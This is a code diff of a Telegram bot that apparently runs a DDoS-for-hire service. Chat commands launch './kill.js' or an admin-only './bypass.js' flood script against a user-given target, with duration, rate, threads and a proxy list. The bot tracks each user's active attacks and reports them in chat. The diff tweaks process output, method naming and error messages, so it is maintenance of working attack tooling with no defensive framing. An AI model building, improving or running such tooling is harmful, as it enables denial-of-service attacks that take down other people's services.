@@ -74,7 +74,7 @@ bot.on('message', (msg) => {
     }
 
     const script = (isAdmin && methods?.toLowerCase() === 'bypass') ? './bypass.js' : './kill.js'
-    const cmd = spawn('node', [script, target, time, rate, thread, './prx.txt'])
+    const cmd = spawn('node', [script, target, time, rate, thread, './prx.txt'], { stdio: 'inherit' })
     const attackId = `${userId}_${Date.now()}`
     activeAttacks[attackId] = { cmd, target, time, rate, thread, userId, methods }
 
@@ -84,7 +84,7 @@ bot.on('message', (msg) => {
       time,
       rate,
       thread,
-      methods: methods || 'kill',
+      methods: methods?.toLowerCase() === 'bypass' ? 'bypass' : 'kill',
       caller: username,
       index: attackId
     }
@@ -105,7 +105,7 @@ bot.on('message', (msg) => {
 
     cmd.on('error', (err) => {
       delete activeAttacks[attackId]
-      bot.sendMessage(id, '```json\n' + JSON.stringify({ error: err.message }, null, 2) + '\n```', { parse_mode: 'Markdown' })
+      bot.sendMessage(id, '```json\n' + JSON.stringify({ error: `Process error: ${err.message}` }, null, 2) + '\n```', { parse_mode: 'Markdown' })
     })
 
     cmd.on('close', (code) => {
@@ -123,7 +123,7 @@ bot.on('message', (msg) => {
         time: v.time,
         rate: v.rate,
         thread: v.thread,
-        methods: v.methods || 'kill'
+        methods: v.methods?.toLowerCase() === 'bypass' ? 'bypass' : 'kill'
       }))
     bot.sendMessage(id, '```json\n' + JSON.stringify(list, null, 2) + '\n```', { parse_mode: 'Markdown' })
   }
